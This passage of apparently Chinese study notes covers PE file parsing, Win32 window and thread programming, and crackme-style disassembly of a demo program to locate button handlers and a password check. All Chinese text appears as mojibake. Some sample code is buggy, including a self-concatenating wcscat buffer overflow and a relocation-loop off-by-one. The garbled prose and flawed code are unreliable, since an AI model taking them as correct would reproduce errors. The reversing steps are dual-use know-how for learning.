‡å‡†PEå¤´+æ ‡å‡†PEå¤´çš„å¤§å° 20 // PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); DWORD* AddressOfNamesFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNames)); printf(\"å‡½æ•°åœ°å€ä¸ºï¼š%x\\n\",AddressOfNamesFunctionsAddress[FunctionOrdinals-Export_Directory-\u003eBase]); } é‡å®šä½è¡¨ æ‰“å°æ‰€æœ‰é‡å®šä½ä¿¡æ¯\nDWORD PrintRelocation(LPVOID pFileBuffer){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"è¯»å–åˆ°å†…å­˜çš„pfilebufferæ— æ•ˆï¼\\n\"); return 0; } if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"ä¸å«MZæ ‡å¿—ï¼Œä¸æ˜¯exeæ–‡ä»¶ï¼\\n\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"æ— æœ‰æ•ˆçš„PEæ ‡å¿—\\n\"); return 0; } pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); if(pOptionHeader-\u003eDataDirectory[5].VirtualAddress == 0){ printf(\"%s\",\"ä¸å­˜åœ¨é‡å®šä½è¡¨...\"); return 0; } printf(\"========1=========\\n\"); PIMAGE_BASE_RELOCATION ReloCation = (_IAMGE_BASE_RELOCATION*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[5].VirtualAddress)); printf(\"===é‡å®šä½è¡¨====\\n\"); printf(\"å†…å­˜åœ°å€%x\\n\",pOptionHeader-\u003eDataDirectory[5].VirtualAddress); printf(\"å†…å­˜å¤§å°%x\\n\",pOptionHeader-\u003eDataDirectory[5].Size); int cnt = 0; while (true) { if (ReloCation-\u003eVirtualAddress != 0 \u0026\u0026 ReloCation-\u003eSizeOfBlock !=0) { printf(\"**********************************\\n\"); printf(\"%x\\n\",ReloCation); int num = (ReloCation-\u003eSizeOfBlock - 8) / 2; for (int i =0;i\u003cnum-1;i++) { WORD* offset = (WORD*)((char*)ReloCation+8+2*i); if (*offset \u003e= 0x3000) { printf(\"ç¬¬%xé¡¹\\tåœ°å€:%X\\tåç§»:%X\\n\", ReloCation-\u003eVirtualAddress, *offset-0x3000); } } ReloCation = (_IMAGE_BASE_RELOCATION*)((char*)ReloCation + ReloCation-\u003eSizeOfBlock); cnt++; }else{ break; } } printf(\"%d\\n\", cnt); } é‡å®šä½è¡¨è¿™æ ·è®¾è®¡æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ\nç”¨æœ€å°‘çš„ç©ºé—´æ¥è®°å½•è¦ä¿®æ”¹çš„åœ°å€\nç§»åŠ¨å¯¼å‡ºè¡¨-é‡å®šä½è¡¨ åœ¨DLLæ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå¹¶å°†å¯¼å‡ºè¡¨ä¿¡æ¯ç§»åŠ¨åˆ°è¿™ä¸ªæ–°çš„èŠ‚ä¸­ ä½¿ç”¨å·¥å…·æ‰“å¼€ä¿®æ”¹åçš„DLLçœ‹èƒ½å¦æ­£å¸¸è§£æ åœ¨DLLä¸­æ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå¹¶å°†é‡å®šä½è¡¨ç§»åŠ¨åˆ°è¿™ä¸ªæ–°çš„èŠ‚ä¸­ ä¿®æ”¹DLLçš„ImageBase,æ ¹æ®é‡å®šä½è¡¨ä¿®æ­£ï¼Œç„¶åå­˜ç›˜ã€‚çœ‹DLLæ˜¯å¦å¯ä»¥ä½¿ç”¨ å¯¼å…¥è¡¨ æ‰“å°notepad.exeå¯¼å…¥è¡¨çš„å…¨éƒ¨ä¿¡æ¯ Win32 å®½å­—ç¬¦ åˆ†åˆ«ä½¿ç”¨wchar_t / wprintf / wcslen / wcscpy / wcscat / wcscmp / wcsstrå†™ä¸€ä¸ªä¾‹å­\n#include \u003cwindows.h\u003e #include \"main.h\" #include \u003clocale.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow) { setlocale(LC_ALL,\"\"); wchar_t str1[] = L\"ä½ å¥½\"; wchar_t str2[] = L\"ä¸–ç•Œ\"; wprintf(L\"æ‰“å°ï¼š%ls,%ls\\n\",str1,str2); int Len = wcslen(str1); printf(\"%d\\n\",Len); wcscpy(str1,str2); wprintf(L\"æ‰“å°ï¼š%ls,%ls\\n\",str1,str2); wcscat(str1,str1); wprintf(L\"æ‰“å°ï¼š%ls,%ls\\n\",str1,str2); int dif = wcscmp(str1,str2); printf(\"%d\\n\",dif); wchar_t* search = wcsstr(str1,L\"ä¸–\"); wprintf(L\"%ls\\n\",search); return 0; } æŸ¥MSDNäº†è§£WinMainå…¶ä»–3ä¸ªå‚æ•°çš„æ„ä¹‰\nint WINAPI WinMain( HINSTANCE hInstance, // åº”ç”¨ç¨‹åºå½“å‰å®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // åº”ç”¨ç¨‹åºå…ˆå‰å®ä¾‹çš„å¥æŸ„ (ç°åœ¨é€šå¸¸ä¸ºNULL) LPSTR lpCmdLine, // æŒ‡å‘åº”ç”¨ç¨‹åºå‘½ä»¤è¡Œå­—ç¬¦ä¸²çš„æŒ‡é’ˆ (å°±æ˜¯å‘½ä»¤è¡Œå‚æ•°) int nCmdShow // æŒ‡å®šçª—å£åº”å¦‚ä½•æ˜¾ç¤º (æ˜¯å¦è¢«æœ€å°åŒ–ï¼Œæœ€å¤§åŒ–æˆ–æ­£å¸¸æ˜¾ç¤º) ); äº‹ä»¶-æ¶ˆæ¯ åˆ›å»ºä¸€ä¸ªçª—å£ç¨‹åºï¼Œå­¦ä¹ å¦‚ä½•æŸ¥è¯¢æ–‡æ¡£\n#include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e HINSTANCE hAppInstance; LRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ); int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. hAppInstance = hInstance; //çª—å£çš„ç±»å PSTR className = \"My First Window\"; // åˆ›å»ºçª—å£ç±»çš„å¯¹è±¡ WNDCLASS wndclass = {0};\t//ä¸€å®šè¦å…ˆå°†æ‰€æœ‰å€¼èµ‹å€¼ wndclass.hbrBackground = (HBRUSH)COLOR_MENU;\t//çª—å£çš„èƒŒæ™¯è‰² wndclass.hCursor = LoadCursor(NULL,IDC_APPSTARTING);\twndclass.lpfnWndProc = WindowProc;\t//çª—å£è¿‡ç¨‹å‡½æ•° wndclass.lpszClassName = className;\t//çª—å£ç±»çš„åå­—\twndclass.hInstance = hInstance;\t//å®šä¹‰çª—å£ç±»çš„åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ // æ³¨å†Œçª—å£ç±» // å‚åŠ MSDNæ–‡æ¡£RegisterClass-\u003eParametersï¼š // You must fill the structure with the appropriate class attributes // before passing it to the function. RegisterClass(\u0026wndclass); // åˆ›å»ºçª—å£ HWND hwnd = CreateWindow( className,\t//ç±»å \"æˆ‘çš„ç¬¬ä¸€ä¸ªçª—å£\",\t//çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW,\t//çª—å£å¤–è§‚æ ·å¼ 10,\t//ç›¸å¯¹äºçˆ¶çª—å£çš„Xåæ ‡ 10,\t//ç›¸å¯¹äºçˆ¶çª—å£çš„Yåæ ‡ 600,\t//çª—å£çš„å®½åº¦ 300,\t//çª—å£çš„é«˜åº¦ NULL,\t//çˆ¶çª—å£å¥æŸ„ï¼Œä¸ºNULL NULL,\t//èœå•å¥æŸ„ï¼Œä¸ºNULL hInstance,\t//å½“å‰åº”ç”¨ç¨‹åºçš„å¥æŸ„ NULL);\t//é™„åŠ æ•°æ®ä¸€èˆ¬ä¸ºNULL if(hwnd == NULL)\t//æ˜¯å¦åˆ›å»ºæˆåŠŸ return 0; // æ˜¾ç¤ºçª—å£ ShowWindow(hwnd, SW_SHOW); // æ›´æ–°çª—å£ UpdateWindow(hwnd); // æ¶ˆæ¯å¾ªç¯ MSG msg; while(GetMessage(\u0026msg, NULL, 0, 0)) { TranslateMessage(\u0026msg); DispatchMessage(\u0026msg); } return 0; } LRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ) { switch(uMsg) { //çª—å£æ¶ˆæ¯ case WM_CREATE: { printf(\"WM_CREATE %d %d\\n\",wParam,lParam); CREATESTRUCT* createst = (CREATESTRUCT*)lParam; printf(\"CREATESTRUCT %s\\n\",createst-\u003elpszClass); break; } case WM_MOVE: { printf(\"WM_MOVE %d %d\\n\",wParam,lParam); POINTS points = MAKEPOINTS(lParam); printf(\"X Y %d %d\\n\",points.x,points.y); break; } case WM_SIZE: { printf(\"WM_SIZE %d %d\\n\",wParam,lParam); int newWidth = (int)(short) LOWORD(lParam); int newHeight = (int)(short) HIWORD(lParam); printf(\"WM_SIZE %d %d\\n\",newWidth,newHeight); break; } case WM_DESTROY: { printf(\"WM_DESTROY %d %d\\n\",wParam,lParam); PostQuitMessage(0); return 0; break; } //é”®ç›˜æ¶ˆæ¯ case WM_KEYUP: { printf(\"WM_KEYUP %d %d\\n\",wParam,lParam); break; } case WM_KEYDOWN: { printf(\"WM_KEYDOWN %d %d\\n\",wParam,lParam); break; } //é¼ æ ‡æ¶ˆæ¯ case WM_LBUTTONDOWN: { printf(\"WM_LBUTTONDOWN %d %d\\n\",wParam,lParam); POINTS points = MAKEPOINTS(lParam); printf(\"WM_LBUTTONDOWN %d %d\\n\",points.x,points.y); break; } default: return DefWindowProc(hwnd,uMsg,wParam,lParam); } return 0; } æŸ¥ä¸€ä¸‹Windowsæœ‰å¤šå°‘ç§æ¶ˆæ¯ï¼Œæ¦‚è¦äº†è§£ä¸€ä¸‹æ¯ä¸ªæ¶ˆæ¯çš„ä½œç”¨\nWNDCLASS wndclass = {0};ä¸WNDCLASS wndclass;çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ\nè¦å¯¹é‡Œé¢çš„æˆå‘˜å…¨é¢åˆå§‹åŒ–\nespå¯»å€-å®šä½å›è°ƒå‡½æ•° æ‰¾åˆ°é‚£ä¸‰ä¸ªå­—æ¯\n.text:00401124 cmp eax, 41h ; 'A' .text:00401127 jz short loc_401172 .text:00401129 cmp eax, 46h ; 'F' .text:0040112C jz short loc_401161 .text:0040112E cmp eax, 67h ; 'g' .text:00401131 jz short loc_401150 æ ¹æ®WndClassé‡Œé¢çš„å›è°ƒå‡½æ•°å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ¯”è¾ƒã€‚ä¸è¿‡è¿™ä¸ª67hå¥½åƒæ˜¯å°é”®ç›˜çš„7ã€‚\nå­çª—å£-æ¶ˆæ¯å¤„ç†å‡½æ•° æ‰¾åˆ°æŒ‰é’®å¦å¤–çš„æ“ä½œ\n.text:0040111A cmp eax, 3E9h .text:0040111F jnz short loc_401144 .text:00401121 push 0 ; uType .text:00401123 push offset Caption ; \"Demo\" .text:00401128 push offset Text ; \"Find Me 1\" .text:0040112D push 0 ; hWnd .text:0040112F mov dword_408514, 1 .text:00401139 call ds:MessageBoxA .text:0040113F xor eax, eax .text:00401141 retn 10h .text:00401144 ; --------------------------------------------------------------------------- .text:00401144 .text:00401144 loc_401144: ; CODE XREF: sub_401100+1Fâ†‘j .text:00401144 cmp eax, 3EAh .text:00401149 jnz short loc_40116E .text:0040114B push 0 ; uType .text:0040114D push offset Caption ; \"Demo\" .text:00401152 push offset aFindMe2 ; \"Find Me 2\" .text:00401157 push 0 ; hWnd .text:00401159 mov dword_408514, 2 .text:00401163 call ds:MessageBoxA .text:00401169 xor eax, eax .text:0040116B retn 10h .text:0040116E ; --------------------------------------------------------------------------- .text:0040116E .text:0040116E loc_40116E: ; CODE XREF: sub_401100+49â†‘j .text:0040116E cmp eax, 3EBh .text:00401173 jnz short loc_401198 .text:00401175 push 0 ; uType .text:00401177 push offset Caption ; \"Demo\" .text:0040117C push offset aFindMe3 ; \"Find Me 3\" .text:00401181 push 0 ; hWnd .text:00401183 mov dword_408514, 3 .text:0040118D call ds:MessageBoxA .text:00401193 xor eax, eax .text:00401195 retn 10h åº”è¯¥æ˜¯å‘åœ°å€0x408514åˆ†åˆ«èµ‹å€¼1ï¼Œ2ï¼Œ3\né€šè¿‡åæ±‡ç¼–å…¶å®å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸ºè¿™ä¸‰ä¸ªæŒ‰é’®æ˜¯å±äºè¿™ä¸ªçª—å£ç±»çš„æ‰€ä»¥è¿™äº›æŒ‰é’®çš„å›è°ƒå‡½æ•°ä¹Ÿä¼šåœ¨çª—å£çš„WndProcä¸‹ã€‚ç‚¹å‡»æŒ‰é’®çš„æ¶ˆæ¯ä¸ç‚¹å‡»çª—å£çš„æ¶ˆæ¯ä¼šåˆ†å¼€ï¼Œä¼¼ä¹æ˜¯å› ä¸ºifâ€¦elseâ€¦éš”å¼€äº†ã€‚\nèµ„æºæ–‡ä»¶-æ¶ˆæ¯æ–­ç‚¹ æ‰¾å›è°ƒ1\n00401060 \u003e \\8B4C24 08 MOV ECX,DWORD PTR SS:[ESP+8] ; Case 3EA of switch 0040104D 00401064 . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 00401066 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 0040106B . 68 48604000 PUSH ReverseT.00406048 ; |Text = \"Button 3\" 00401070 . 51 PUSH ECX ; |hOwner 00401071 . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA 00401077 . 8BC6 MOV EAX,ESI 00401079 . 5E POP ESI 0040107A . C2 1000 RETN 10 0040107D \u003e 8B5424 08 MOV EDX,DWORD PTR SS:[ESP+8] ; Case 3E9 of switch 0040104D 00401081 . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 00401083 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 00401088 . 68 3C604000 PUSH ReverseT.0040603C ; |Text = \"Button 2\" 0040108D . 52 PUSH EDX ; |hOwner 0040108E . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA 00401094 . 8BC6 MOV EAX,ESI 00401096 . 5E POP ESI 00401097 . C2 1000 RETN 10 0040109A \u003e 8B4424 08 MOV EAX,DWORD PTR SS:[ESP+8] ; Case 3E8 of switch 0040104D 0040109E . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 004010A0 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 004010A5 . 68 30604000 PUSH ReverseT.00406030 ; |Text = \"Button 1\" 004010AA . 50 PUSH EAX ; |hOwner 004010AB . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA æ‰¾å¯†ç \né¦–å…ˆæ˜¯è°ƒäº†ä¸€ä¸ªå‡½æ•°åˆ¤æ–­EAXï¼Œåé¢å°±æ˜¯æ˜¯å¦è¾“å…¥æ­£ç¡®è¿›è¡Œè·³è½¬ï¼š\n004010D3 . E8 28FFFFFF CALL ReverseT.00401000 004010D8 . 83C4 04 ADD ESP,4 004010DB . 85C0 TEST EAX,EAX 004010DD . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 004010DF . 74 18 JE SHORT ReverseT.004010F9 ; | åé¢çš„æ¯”è¾ƒçš„ä½ç½®åº”è¯¥æ˜¯ä¸‹é¢çš„ä»£ç ï¼š\n0040105C |. 8D7C24 0C LEA EDI,DWORD PTR SS:[ESP+C] 00401060 |. 83C9 FF OR ECX,FFFFFFFF 00401063 |. 33C0 XOR EAX,EAX 00401065 |. F2:AE REPNE SCAS BYTE PTR ES:[EDI] 00401067 |. F7D1 NOT ECX 00401069 |. 49 DEC ECX 0040106A |. 83F9 03 CMP ECX,3 0040106D |. 75 20 JNZ SHORT ReverseT.0040108F 0040106F |. 8D7C24 5C LEA EDI,DWORD PTR SS:[ESP+5C] 00401073 |. 83C9 FF OR ECX,FFFFFFFF 00401076 |. F2:AE REPNE SCAS BYTE PTR ES:[EDI] 00401078 |. F7D1 NOT ECX 0040107A |. 49 DEC ECX 0040107B |. 83F9 05 CMP ECX,5 0040107E |. 75 0F JNZ SHORT ReverseT.0040108F å› ä¸ºå‰é¢æ˜¯ä¸¤ä¸ªGetWindowTextAå‡½æ•°ï¼Œæ‰€ä»¥æœ‰ç†ç”±è¯´æ˜ä¸Šé¢çš„è·å–æˆ‘è¾“å…¥çš„å†…å®¹ï¼Œåé¢è¿›è¡Œæ¯”è¾ƒã€‚\nèµ„æºè¡¨ï¼ˆPEï¼‰ ç¼–å†™ç¨‹åºï¼Œå®šä½æŸä¸ªèµ„æºåœ¨PEæ–‡ä»¶ä¸­çš„ä½ç½® ç¼–å†™ç¨‹åºï¼Œæä¾›ç¨‹åºå›¾æ ‡èµ„æº ç¼–å†™ç¨‹åºï¼Œä¿®æ”¹å¯¹è¯æ¡†æ ‡é¢˜ é¡¹ç›® ç•Œé¢å®ç°ï¼š\n// project.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cCommCtrl.h\u003e #pragma comment(lib,\"comctl32.lib\") VOID EnumMoudles(HWND hListProcess, WPARAM wParam, LPARAM lParam) { DWORD dwRowId; TCHAR szPid[21]; LV_ITEM lv; //åˆå§‹åŒ– memset(\u0026lv, 0, sizeof(LV_ITEM)); //è·å–é€‰æ‹©è¡Œ dwRowId = SendMessage(hListProcess, LVM_GETNEXTITEM,-1 , LVNI_SELECTED); if (dwRowId == -1) { MessageBox(NULL, TEXT(\"è¯·é€‰æ‹©è¿›ç¨‹\"), TEXT(\"å‡ºé”™å•¦\"), MB_OK); return; } //è·å–PID lv.iSubItem = 1; lv.pszText = szPid; lv.cchTextMax = 0x20; SendMessage(hListProcess, LVM_GETITEMTEXT, dwRowId, (DWORD)\u0026lv); MessageBox(NULL, szPid, TEXT(\"PID\"), MB_OK); } VOID InitMoudleListView(HWND hDlg) { //è®¾ç½®çª—å£é£æ ¼éœ€è¦è°ƒç”¨ç»“æ„ä½“ LV_COLUMN lv; HWND hListMoudles; //åˆå§‹åŒ– memset(\u0026lv, 0, sizeof(LV_COLUMN)); //è·å–æ¨¡å—åˆ—è¡¨å¥æŸ„ hListMoudles = GetDlgItem(hDlg, IDC_LIST_Down); //è®¾ç½®æ•´è¡Œé€‰ä¸­ SendMessage(hListMoudles, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //ç¬¬ä¸€åˆ—ï¼š lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"æ¨¡å—åç§°\"); lv.cx = 330; lv.iSubItem = 0; //ListView_Insertcolumn(hListMoudles,0,\u0026lv); SendMessage(hListMoudles, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //ç¬¬äºŒåˆ—ï¼š lv.pszText = TEXT(\"æ¨¡å—ä½ç½®\"); lv.cx = 330; lv.iSubItem = 1; SendMessage(hListMoudles, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); } VOID EnumProcess(HWND hListProcess) { LV_ITEM vitem; //åˆå§‹åŒ–ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹ memset(\u0026vitem, 0, sizeof(LV_ITEM)); vitem.mask = LVIF_TEXT; //å‡æ•°æ®ï¼š vitem.pszText = TEXT(\"csrss.exe\"); vitem.iItem = 0; vitem.iSubItem = 0; //ListView_Insertem(hListProcess,*vitem); SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"448\"); vitem.iItem = 0; vitem.iSubItem = 1; SendMessage(hListProcess, LVM_SETITEM, 0, (DWORD)\u0026vitem); //ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"56590000\"); vitem.iItem = 0; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"000F0000\"); vitem.iItem = 0; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); //ç¬¬äºŒä¸ªè¿›ç¨‹å‡æ•°æ®ï¼š vitem.pszText = TEXT(\"QQ.exe\"); vitem.iItem = 1; vitem.iSubItem = 0; SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"153\"); vitem.iItem = 1; vitem.iSubItem = 1; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"65580000\"); vitem.iItem = 1; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"001E0000\"); vitem.iItem = 1; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); //ç¬¬ä¸‰ä¸ªè¿›ç¨‹å‡æ•°æ®ï¼š vitem.pszText = TEXT(\"WeChat.exe\"); vitem.iItem = 2; vitem.iSubItem = 0; SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"256\"); vitem.iItem = 2; vitem.iSubItem = 1; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"75960000\"); vitem.iItem = 2; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"015B0000\"); vitem.iItem = 2; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); } VOID InitProcessListView(HWND hDlg) { //è®¾ç½®çª—å£é£æ ¼è°ƒç”¨ç»“æ„ä½“ LV_COLUMN lv; HWND hListProcess; //åˆå§‹åŒ– memset(\u0026lv, 0, sizeof(LV_COLUMN)); //è·å–è¿›ç¨‹åˆ—è¡¨å¥æŸ„ hListProcess = GetDlgItem(hDlg, IDC_LIST_Process); //è®¾ç½®æ•´è¡Œé€‰ä¸­ SendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //å‡ºé”™ä»£ç ï¼šï¼šï¼šï¼šï¼š //SendMessage(hListProcess, LVM_GETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //ç¬¬ä¸€åˆ—ï¼š lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"è¿›ç¨‹\"); //åˆ—æ ‡é¢˜ lv.cx = 225; //è¡Œå®½ lv.iSubItem = 0; //ListView_InsertColumn(hListProcess,0,\u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //ç¬¬äºŒåˆ— lv.pszText = TEXT(\"PID\"); lv.cx = 150; lv.iSubItem = 1; //ListView_InsertColumn(hListProcess, 1, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 1, (DWORD)\u0026lv); //ç¬¬ä¸‰åˆ— lv.pszText = TEXT(\"é•œåƒåŸºå€\"); lv.cx = 134; lv.iSubItem = 2; //ListView_InsertColumn(hListProcess, 2, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 2, (DWORD)\u0026lv); //ç¬¬å››åˆ— lv.pszText = TEXT(\"é•œåƒå¤§å°\"); lv.cx = 150; lv.iSubItem = 3; //ListView_InsertColumn(hListProcess, 3, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 3, (DWORD)\u0026lv); EnumProcess(hListProcess); } BOOL CALLBACK MainDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam) { BOOL nRet = FALSE; switch (uMsg) { case WM_CLOSE: { EndDialog(hDlg, 0); PostQuitMessage(0); break; } case WM_INITDIALOG: { InitProcessListView(hDlg); //è®¾ç½®ProcessListViewçš„é£æ ¼ï¼Œåˆå§‹åŒ–è¿›ç¨‹åˆ—è¡¨ InitMoudleListView(hDlg); //è®¾ç½®MoudleListViewçš„é£æ ¼ï¼Œåˆå§‹åŒ–æ¨¡å—åˆ—è¡¨ break; } case WM_COMMAND: { switch (LOWORD(wParam)) { case IDC_BUTTON_protect: { //DialogBox(hIns, MAKEINTRESOURCE(IDD_ABOUTBOX), NULL, NULL); } case IDC_BUTTON_PE: { //æ‰“å¼€æ–°çš„å¯¹è¯æ¡†ï¼ŒPEæŸ¥çœ‹å™¨ return 0; } case IDC_BUTTON_logout: { EndDialog(hDlg, 0); PostQuitMessage(0); return TRUE; } } } case WM_NOTIFY: { NMHDR* pNMHDR = (NMHDR*)lParam; if (wParam == IDC_LIST_Down \u0026\u0026 pNMHDR-\u003ecode == NM_CLICK) { EnumMoudles(GetDlgItem(hDlg, IDC_LIST_Down), wParam, lParam); } break; } } return nRet; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, (DLGPROC)MainDlgProc); return 0; } åˆ›å»ºçº¿ç¨‹ ä¸€ä¸ªåŠ ä¸€ä¸ªå‡\n// qqqq.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e HWND sub; HWND plus; DWORD WINAPI doSub(LPVOID lpParameter){ //è·å–æ–‡æœ¬æ¡†å†…å®¹ TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(sub, szBuffer, 10); //å­—ç¬¦è½¬æ•°å­— DWORD time; sscanf(szBuffer, \"%d\", \u0026time); //è®¡ç®—å¹¶å†™å›æ–‡æœ¬ while(time \u003e 0){ memset(szBuffer, 0, 10); Sleep(1000); sprintf(szBuffer,\"%d\", --time); SetWindowText(sub,szBuffer); } return 0; } DWORD WINAPI doPlus(LPVOID lpParameter){ //è·å–æ–‡æœ¬æ¡†å†…å®¹ TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(plus, szBuffer, 10); //å­—ç¬¦è½¬æ•°å­— DWORD time; sscanf(szBuffer, \"%d\", \u0026time); //è®¡ç®—å¹¶å†™å›æ–‡æœ¬ while(time \u003c 1000){ memset(szBuffer, 0, 10); Sleep(1000); sprintf(szBuffer,\"%d\", ++time); SetWindowText(plus,szBuffer); } return 0; } BOOL CALLBACK DialogProc( HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ) { switch(uMsg) { case WM_INITDIALOG : { //åˆå§‹åŒ–æ–‡æœ¬æ¡† sub = GetDlgItem(hwndDlg,IDC_EDIT_SUB); SetWindowText(sub,TEXT(\"1000\")); plus = GetDlgItem(hwndDlg, IDC_EDIT_ADD); SetWindowText(plus,TEXT(\"0\")); } return TRUE; case WM_COMMAND : switch (LOWORD (wParam)) { case IDC_BUTTON_START: HANDLE hThread = ::CreateThread(NULL, 0, doSub, NULL, 0, NULL); //å¦‚æœä¸åœ¨å…¶ä»–çš„åœ°æ–¹å¼•ç”¨å®ƒ å…³é—­å¥æŸ„ ::CloseHandle(hThread); HANDLE hThread2 = ::CreateThread(NULL, 0, doPlus, NULL, 0, NULL); ::CloseHandle(hThread2); return TRUE; } break; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; } return FALSE; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, DialogProc); return 0; } çº¿ç¨‹æ§åˆ¶ å€¼ä¸ºä»€ä¹ˆä¸å‡†ç¡®ï¼Ÿ\né€šä¿—æ˜“æ‡‚çš„è§£é‡Šï¼š\nå‡è®¾æœ‰ä¸€ä¸ªå…¬å…±çš„ç™½æ¿ï¼Œä¸Šé¢å†™ç€ä¸€ä¸ªæ•°å­—ï¼Œæ¯”å¦‚ â€œ0â€ã€‚ ç°åœ¨æœ‰ä¸¤ä¸ªå°æœ‹å‹ï¼Œå°æ˜å’Œå°çº¢ï¼Œä»–ä»¬éƒ½æƒ³è½®æµåœ¨è¿™ä¸ªç™½æ¿ä¸ŠæŠŠæ•°å­—åŠ  1ï¼Œå¹¶ä¸”æ¯ä¸ªäººéƒ½è¦åŠ  10000 æ¬¡ã€‚ æˆ‘ä»¬å¸Œæœ›æœ€ç»ˆç™½æ¿ä¸Šçš„æ•°å­—æ˜¯ 20000ã€‚\nå°æ˜æƒ³åŠ  1ï¼š 